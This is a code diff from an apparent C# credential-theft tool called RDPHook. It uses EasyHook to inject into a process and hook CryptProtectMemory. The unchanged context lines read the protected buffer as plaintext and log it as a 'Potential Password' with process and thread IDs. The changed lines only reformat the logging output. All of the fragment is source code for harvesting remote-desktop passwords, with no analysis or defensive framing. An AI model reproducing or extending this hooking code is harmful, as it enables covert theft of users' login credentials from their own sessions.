@@ -93,7 +93,7 @@ namespace RDPHook
             // Activate hooks on all threads except the current thread
             createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
 
-            _server.ReportMessage("Hook in place!");
+            _server.ReportMessage("[+] Hook in place in process " + context.HostPID.ToString());
 
             // Wake up the process (required if using RemoteHooking.CreateAndInject)
             EasyHook.RemoteHooking.WakeUpProcess();
@@ -160,9 +160,10 @@ namespace RDPHook
 
                         //Get string from memory address passed to CryptProtectMemory
                         var password = Marshal.PtrToStringUni(pData, (int)cbData);
+
                      
                         this._messageQueue.Enqueue(
-                            string.Format("PID/ThreadID: {0}/{1}, Potential Password: {2}",
+                            string.Format("[+] PID/ThreadID: {0}/{1}, Potential Password: {2}",
                             EasyHook.RemoteHooking.GetCurrentProcessId(), EasyHook.RemoteHooking.GetCurrentThreadId(), password));
                         
                     }
